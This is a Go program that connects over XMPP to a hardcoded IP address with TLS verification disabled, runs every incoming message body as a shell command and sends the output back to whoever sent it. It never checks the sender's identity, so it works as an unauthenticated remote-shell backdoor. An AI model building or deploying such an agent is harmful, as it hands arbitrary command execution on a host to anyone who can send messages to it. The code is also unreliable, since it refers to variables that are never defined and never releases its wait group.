package main

import (
    "crypto/tls"
    "encoding/xml"
    "fmt"
    "log"
    "os/exec"
    "sync"
    "time"
    
    xmpp "code.google.com/p/goexmpp"
    "github.com/mattn/go-shellwords"
)

type StdLogger struct {
}

func main() {   
    logger := &StdLogger{}
    xmpp.Debug = logger
    xmpp.Info = logger
    xmpp.Warn = logger
    xmpp.TlsConfig = tls.Config{InsecureSkipVerify: true}
    
    // setup our xmpp client
    client, err := xmpp.NewClientFromHost(&jid, pw, nil, "208.112.63.36", 5222)
    if err != nil {
        log.Fatalf("NewClient(%v): %v", jid, err)
    }
    defer close(client.Out)

    // start our xmpp session
    err = client.StartSession(true, &xmpp.Presence{})
    if err != nil {
        log.Fatalf("StartSession: %v", err)
    }
    
    // start our stanza handler
    go handler(client)

    // start our keepalive
    go keepalive(client, 30000)
    
    // wait for all goroutines
    var wg sync.WaitGroup
    wg.Add(2)
    wg.Wait()
}

// handler handles incoming xmpp stanzas
func handler(XMPP_CLIENT *xmpp.Client) {
    for {
        stanza := <-XMPP_CLIENT.In
        if msg, ok := stanza.(*xmpp.Message); ok {
            if msg.Body != nil {
                
                origto := msg.To
                origfrom := msg.From                    
                msg.To = origfrom
                msg.From = origto
                    
                cmdparts, _ := shellwords.Parse(msg.Body.Chardata)                    
                    
                fmt.Println(cmdparts)
                    
                var cmd *exec.Cmd
                if len(cmdparts) == 1 {
                    cmd = exec.Command(cmdparts[0])
                } else if len(cmdparts) > 1 {
                    cmd = exec.Command(cmdparts[0], cmdparts[1:]...)
                }
                    
                go func(CMD *exec.Cmd){
                    time.Sleep(time.Millisecond * 15000)
                    if CMD.Process != nil {
                        CMD.Process.Kill()
                    }                        
                }(cmd)
                    
                var finalout string
                output, outerr := cmd.CombinedOutput()
                if outerr != nil {
                    finalout = "\n"+string(output) + outerr.Error()
                } else {
                    finalout = "\n"+string(output)
                }
                                        
                msg.Innerxml = ""
                msg.Body = &xmpp.Generic{
                    XMLName: xml.Name{"jabber:client", "body"},
                    Chardata: finalout,
                }
                    
                XMPP_CLIENT.Out <- msg
            }                
        }             
    }
}

// keepalive continuously sends a Presence stanza to 
// ensure the server does not close our stream
func keepalive(XMPP_CLIENT *xmpp.Client, INTERVAL_MS time.Duration) {
    ticker := time.NewTicker(time.Millisecond * INTERVAL_MS)
    for {
        select {
            case <-ticker.C:
                XMPP_CLIENT.Out <- &xmpp.Presence{}
        }
    }
}

func (s *StdLogger) Log(v ...interface{}) {
    log.Println(v...)
}

func (s *StdLogger) Logf(fmt string, v ...interface{}) {
    log.Printf(fmt, v...)
}
